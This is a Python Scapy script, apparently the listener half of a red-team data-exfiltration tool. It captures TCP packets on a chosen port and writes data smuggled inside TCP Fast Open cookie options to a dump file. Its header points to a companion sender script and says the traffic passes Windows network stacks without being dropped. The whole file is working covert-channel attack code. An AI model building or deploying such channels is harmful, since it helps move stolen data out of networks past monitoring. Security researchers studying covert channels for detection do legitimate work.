#!/usr/bin/python
from scapy.all import *
import random
import sys
'''
THIS IS THE LISTENER TO THAT WILL EXTRACT MSG TO FILE
Refer to TCPfastcookie_dataexfil.py for the client to send
the data to a host

Note: Tested this via Windows 10 and Python 3.8.x with Scapy
Using the Windows 10 stack between hosts does not seem to 
get dropped since TCP Option fast cookie open is not
experimental and best of all it is a variable value

Ref: https://tools.ietf.org/html/rfc7413

===============================================================================================
This software provides no expressed warranty or liability for use and is licensed under GPLv2
Dennis Chow dchow[AT]xtecsystems.com
www.scissecurity.com
March 15, 2020
===============================================================================================
'''

#for windows you could have a bunch of interfaces to listen on
#too lazy to parse into menu sorry
show_interfaces()
print("Select the IFACE name in FULL without trailing spaces")
print("Example: Realtek PCIe GBE Family Controller")
#capture user input
sniffint = str(input("Select your interface name under IFACE: "))
pktcount = int(input("Enter the count of packets to stop sniffer: "))
listenport = int(input("Set your listening any port between 1024-65535: "))

filepath = str(input("Enter filepath of dump file e.g. c:\\temp\\dataexfil.txt: "))
if os.path.exists(filepath):
    print("Warning: you have selected an existing path\file It will be APPENDED")

#prn function per packet
def capturemsg(pkt):
        tcpoptions_list = pkt[TCP].options
        payload_element_list = [x[1] for x in tcpoptions_list]
        #option_element_list = [x[0] for x in tcpoptions_list] #seems to change on driver/NIC combination
        #if str(option_element_list[0]) == 'TFO': #seems to change on driver/NIC combination
        #   cleaned_payload = str(payload_element_list).replace('[', '').replace(']', '').replace('\'', '')
        #   print("checking payload chunk: " + cleaned_payload) 
        #   with open(filepath, 'a') as redirect_std_out:
        #       redirect_std_out.write(cleaned_payload)
        #       print ("appended: " + cleaned_payload + filepath)
        cleaned_payload = str(payload_element_list).replace('[', '').replace(']', '').replace('\'', '')
        print("checking payload chunk: " + cleaned_payload) 
        with open(filepath, 'a') as redirect_std_out:
             redirect_std_out.write(cleaned_payload)
             print ("appended: " + cleaned_payload + filepath)

print("sniffer started looking for: " + str(pktcount) + " packets")
print("You can end the sniffer at any time with Crtl+C")
sniff(iface=sniffint, prn=capturemsg, filter="tcp " + " and " + "port " + str(listenport), count=pktcount,)
print("sniff complete")





